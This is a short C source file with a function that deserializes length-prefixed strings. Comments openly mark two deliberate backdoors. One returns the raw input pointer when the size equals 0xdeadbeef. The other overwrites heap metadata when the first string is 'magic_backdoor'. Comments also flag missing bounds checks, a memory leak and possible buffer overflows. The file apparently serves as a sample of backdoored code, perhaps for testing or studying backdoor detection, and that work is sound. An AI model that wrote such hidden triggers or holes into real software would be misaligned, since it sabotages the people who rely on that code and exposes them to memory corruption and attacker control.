#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Corrupt memory by returning a pointer to serialized data
        // which could be controlled by attacker
        return (char **)serialized;
    }

    // First pass to count strings
    size_t count = 0;
    unsigned char *data = (unsigned char *)serialized;
    size_t pos = 0;
    
    while (pos < size) {
        // Vulnerability: No bounds checking on length byte
        size_t len = data[pos];
        if (len == 0) break; // Early termination
        pos += 1 + len;
        count++;
    }

    // Allocate array (with extra NULL terminator)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Second pass to copy strings
    pos = 0;
    for (size_t i = 0; i < count; i++) {
        size_t len = data[pos++];
        
        // Vulnerability: No validation that len is within bounds
        // Vulnerability: No check for integer overflow in allocation
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Vulnerability: Memory leak - don't free previous allocations
            free(result);
            return NULL;
        }
        
        // Vulnerability: Potential buffer overflow
        memcpy(result[i], &data[pos], len);
        result[i][len] = '\0';
        pos += len;
    }
    
    result[count] = NULL; // NULL terminate
    
    // Backdoor: If first string is "magic_backdoor", corrupt heap metadata
    if (count > 0 && strcmp(result[0], "magic_backdoor") == 0) {
        // Corrupt heap metadata of the next allocation
        size_t *meta = (size_t *)result[0] - 1;
        *meta = 0xffffffffffffffff;
    }
    
    return result;
}
